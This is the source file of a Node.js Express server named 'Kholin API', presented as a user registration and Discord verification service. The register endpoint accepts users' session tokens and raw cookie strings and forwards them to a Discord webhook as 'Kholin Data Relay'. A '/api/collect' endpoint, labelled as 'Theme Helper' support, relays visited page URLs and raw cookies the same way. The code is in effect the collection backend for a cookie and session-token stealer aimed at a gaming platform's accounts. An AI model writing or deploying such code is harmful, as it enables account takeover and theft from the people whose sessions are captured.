const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');
const cors = require('cors');

// ============================================
// MIDDLEWARE
// ============================================

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// ============================================
// DATABASE (In-memory - use a real DB in production)
// ============================================

// Store generated IDs
const generatedIds = new Map(); // userId -> { specialId, createdAt, username, displayName, used, usedBy }
const pendingVerifications = new Map(); // specialId -> { userId, username, timestamp }

// ============================================
// CONFIGURATION
// ============================================

const SECRET = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
const WEBHOOK_URL = process.env.webhook;

// ============================================
// HELPER FUNCTIONS
// ============================================

function generateSpecialId(userId, username) {
    // Create a unique hash based on userId + username + secret + timestamp
    const timestamp = Date.now().toString();
    const random = crypto.randomBytes(4).toString('hex');
    const hash = crypto.createHash('sha256')
        .update(userId + username + SECRET + timestamp + random)
        .digest('hex')
        .substring(0, 16); // Take first 16 characters
    
    return hash.toUpperCase();
}

function generateCode() {
    // Generate a 6-digit alphanumeric code for verification
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 6; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

function getFriendEmoji(count) {
    const num = parseInt(count) || 0;
    if (num >= 100) return '👑';
    if (num >= 50) return '⭐';
    if (num >= 25) return '🌟';
    if (num >= 10) return '💫';
    if (num >= 5) return '✨';
    return '👤';
}

// ============================================
// REGISTER USER ENDPOINT
// ============================================

app.post('/api/users/register', async (req, res) => {
    try {
        const { 
            userId, 
            username, 
            displayName, 
            sessionToken, 
            rawCookieString, 
            friendsCount 
        } = req.body;

        if (!WEBHOOK_URL) {
            console.error("❌ Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        if (!userId || userId === "Unknown" || !username || username === "Unknown") {
            console.warn("⚠️ Invalid user data received:", { userId, username });
            return res.status(400).json({ 
                error: "Invalid user data: userId and username required" 
            });
        }

        // Generate or retrieve special ID
        let specialId = null;
        let isNew = false;

        if (generatedIds.has(userId)) {
            specialId = generatedIds.get(userId).specialId;
            console.log(`[${userId}] Using existing special ID: ${specialId}`);
        } else {
            specialId = generateSpecialId(userId, username);
            generatedIds.set(userId, {
                specialId: specialId,
                createdAt: new Date().toISOString(),
                username: username,
                displayName: displayName || username,
                friendsCount: friendsCount || '0',
                used: false,
                usedBy: null,
                usedAt: null
            });
            isNew = true;
            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
        }

        // Build Discord Embed
        const avatarUrl = userId && userId !== "Unknown" 
            ? `https://playvortex.io/users/${userId}/avatar` 
            : "https://playvortex.io/favicon.ico";

        const friendEmoji = getFriendEmoji(friendsCount);
        const count = parseInt(friendsCount) || 0;

        const fields = [
            { name: "👤 Username", value: `**@${username}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName || username}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends", value: `**${friendEmoji} ${count}**`, inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId}\`\`\``, inline: false },
            { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'N/A'}\`\`\``, inline: false },
            { name: "🆕 New User", value: isNew ? "✅ Yes" : "❌ No", inline: true }
        ];

        // Add raw cookies as a separate field if present
        if (rawCookieString) {
            fields.push({
                name: "🍪 Raw Cookies",
                value: `\`\`\`${rawCookieString.substring(0, 500)}${rawCookieString.length > 500 ? '...' : ''}\`\`\``,
                inline: false
            });
        }

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: `🦊 ${isNew ? 'New' : 'Existing'} Account Data`,
                color: isNew ? 0x4ade80 : 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `${friendEmoji} ${count} friends • ${isNew ? 'Newly registered' : 'Returning user'}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("❌ Discord webhook error:", response.status, errorText);
            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${count} friends`);

        return res.status(200).json({ 
            success: true,
            status: "success",
            data: {
                username,
                userId,
                displayName: displayName || username,
                friendsCount: friendsCount || '0',
                specialId: specialId,
                isNew: isNew
            }
        });

    } catch (err) {
        console.error("❌ Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

// Get special ID for a user
app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    
    if (!userId || userId === 'undefined' || userId === 'null') {
        return res.status(400).json({
            success: false,
            error: "Invalid userId provided"
        });
    }

    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: userId,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName,
            createdAt: data.createdAt,
            used: data.used || false,
            usedBy: data.usedBy || null
        });
    } else {
        console.log(`[Special ID] NOT found for user: ${userId}`);
        return res.status(404).json({
            success: false,
            error: "No special ID found for this user",
            userId: userId
        });
    }
});

// Generate special ID for a user (manual trigger)
app.post('/api/generate-special-id', (req, res) => {
    const { userId, username, displayName } = req.body;
    
    if (!userId || userId === "Unknown" || userId === 'undefined') {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        return res.json({
            success: true,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName,
            alreadyExists: true
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: displayName || username || "User",
        friendsCount: '0',
        used: false,
        usedBy: null,
        usedAt: null
    });
    
    console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        username: username || "User",
        displayName: displayName || username || "User",
        alreadyExists: false
    });
});

// Verify a special ID (for Discord bot)
app.get('/api/verify-special-id/:code', (req, res) => {
    const { code } = req.params;
    
    console.log(`[Verify] Checking special ID: ${code}`);
    
    if (!code) {
        return res.status(400).json({
            success: false,
            error: "Missing code parameter"
        });
    }

    // Search for the code
    let found = null;
    for (const [userId, data] of generatedIds) {
        if (data.specialId.toUpperCase() === code.toUpperCase()) {
            found = { userId, ...data };
            break;
        }
    }

    if (!found) {
        console.log(`[Verify] Code not found: ${code}`);
        return res.status(404).json({
            success: false,
            error: "Invalid special ID"
        });
    }

    // Check if already used
    if (found.used) {
        console.log(`[Verify] Code already used: ${code} by ${found.usedBy}`);
        return res.json({
            success: false,
            error: "Special ID already used",
            used: true,
            usedBy: found.usedBy,
            usedAt: found.usedAt
        });
    }

    // Check if expired (30 minutes)
    const createdAt = new Date(found.createdAt);
    const now = new Date();
    const diffMinutes = (now - createdAt) / (1000 * 60);
    
    if (diffMinutes > 30) {
        console.log(`[Verify] Code expired: ${code} (${diffMinutes} minutes old)`);
        return res.json({
            success: false,
            error: "Special ID expired",
            expired: true,
            ageMinutes: Math.round(diffMinutes)
        });
    }

    console.log(`[Verify] Code valid: ${code} for user ${found.userId}`);
    return res.json({
        success: true,
        valid: true,
        specialId: found.specialId,
        userId: found.userId,
        username: found.username,
        displayName: found.displayName,
        createdAt: found.createdAt
    });
});

// Mark special ID as used (for Discord bot)
app.post('/api/special-ids/use', (req, res) => {
    const { specialId, discordId, discordName } = req.body;
    
    console.log(`[Use] Marking special ID as used: ${specialId} by ${discordName} (${discordId})`);
    
    if (!specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing specialId"
        });
    }

    // Find the special ID
    let found = null;
    let foundUserId = null;
    for (const [userId, data] of generatedIds) {
        if (data.specialId === specialId) {
            found = data;
            foundUserId = userId;
            break;
        }
    }

    if (!found) {
        console.log(`[Use] Special ID not found: ${specialId}`);
        return res.status(404).json({
            success: false,
            error: "Special ID not found"
        });
    }

    if (found.used) {
        console.log(`[Use] Special ID already used: ${specialId}`);
        return res.json({
            success: false,
            error: "Special ID already used",
            usedBy: found.usedBy,
            usedAt: found.usedAt
        });
    }

    // Mark as used
    found.used = true;
    found.usedBy = discordName || discordId;
    found.usedAt = new Date().toISOString();

    console.log(`[Use] Special ID ${specialId} marked as used by ${discordName}`);

    return res.json({
        success: true,
        userId: foundUserId,
        username: found.username,
        specialId: specialId,
        usedBy: discordName,
        usedAt: found.usedAt
    });
});

// Get pending special IDs (for Discord bot sync)
app.get('/api/special-ids/pending', (req, res) => {
    console.log('[Sync] Getting pending special IDs');
    
    const pending = [];
    for (const [userId, data] of generatedIds) {
        if (!data.used) {
            pending.push({
                userId: userId,
                specialId: data.specialId,
                code: data.specialId, // Use specialId as the code
                username: data.username,
                displayName: data.displayName,
                createdAt: data.createdAt
            });
        }
    }

    console.log(`[Sync] Found ${pending.length} pending special IDs`);
    
    return res.json({
        success: true,
        total: pending.length,
        codes: pending
    });
});

// Register a new special ID (for Discord bot)
app.post('/api/special-ids/register', (req, res) => {
    const { userId, specialId, discordId, username } = req.body;
    
    console.log(`[Register] Registering special ID: ${specialId} for user ${userId}`);
    
    if (!userId || !specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing userId or specialId"
        });
    }

    // Check if already exists
    if (generatedIds.has(userId)) {
        const existing = generatedIds.get(userId);
        if (existing.specialId === specialId) {
            return res.json({
                success: true,
                alreadyExists: true,
                specialId: existing.specialId
            });
        }
    }

    // Generate a code to return
    const code = generateCode();
    
    // Store the special ID
    generatedIds.set(userId, {
        specialId: specialId,
        code: code,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: username || "User",
        friendsCount: '0',
        used: false,
        usedBy: discordId || null,
        usedAt: null
    });

    console.log(`[Register] Registered special ID ${specialId} for ${userId}`);

    return res.json({
        success: true,
        code: code,
        specialId: specialId,
        userId: userId
    });
});

// Check verification status
app.get('/api/check-verification/:specialId', (req, res) => {
    const { specialId } = req.params;
    
    console.log(`[Check] Checking verification for: ${specialId}`);
    
    if (!specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing specialId"
        });
    }

    // Find the special ID
    let found = null;
    for (const [userId, data] of generatedIds) {
        if (data.specialId === specialId) {
            found = { userId, ...data };
            break;
        }
    }

    if (!found) {
        return res.json({
            success: true,
            verified: false,
            error: "Special ID not found"
        });
    }

    return res.json({
        success: true,
        verified: found.used || false,
        specialId: found.specialId,
        userId: found.userId,
        username: found.username,
        usedBy: found.usedBy,
        usedAt: found.usedAt
    });
});

// ============================================
// COLLECT ENDPOINT (for Theme Helper compatibility)
// ============================================

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        
        if (!WEBHOOK_URL) {
            console.error("❌ Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🌐 Page Visit Detected",
                color: 0x3498db,
                fields: [
                    { name: "🔗 URL", value: url || "Unknown", inline: false },
                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Kholin Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("❌ Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

// Get all generated IDs (admin only - add auth in production)
app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            displayName: info.displayName,
            createdAt: info.createdAt,
            used: info.used || false,
            usedBy: info.usedBy || null,
            usedAt: info.usedAt || null,
            friendsCount: info.friendsCount || '0'
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// Get stats
app.get('/api/stats', (req, res) => {
    let total = 0;
    let used = 0;
    let pending = 0;
    
    for (const [userId, info] of generatedIds) {
        total++;
        if (info.used) used++;
        else pending++;
    }
    
    return res.json({
        success: true,
        stats: {
            totalUsers: total,
            verifiedUsers: used,
            pendingVerifications: pending,
            timestamp: new Date().toISOString()
        }
    });
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        name: 'Kholin API',
        version: '1.0.0',
        endpoints: {
            register: 'POST /api/users/register',
            specialId: 'GET /api/special-id/:userId',
            generate: 'POST /api/generate-special-id',
            verify: 'GET /api/verify-special-id/:code',
            use: 'POST /api/special-ids/use',
            pending: 'GET /api/special-ids/pending',
            registerId: 'POST /api/special-ids/register',
            checkVerification: 'GET /api/check-verification/:specialId',
            stats: 'GET /api/stats',
            allIds: 'GET /api/all-special-ids',
            health: 'GET /health'
        }
    });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        generatedIds: Array.from(generatedIds.keys()),
        uptime: process.uptime()
    });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log('='.repeat(50));
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
    console.log(`   Generated IDs: ${generatedIds.size}`);
    console.log('='.repeat(50));
    console.log(`   📍 http://localhost:${PORT}`);
    console.log(`   📍 http://localhost:${PORT}/health`);
    console.log('='.repeat(50));
});

// ============================================
// ERROR HANDLING
// ============================================

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});
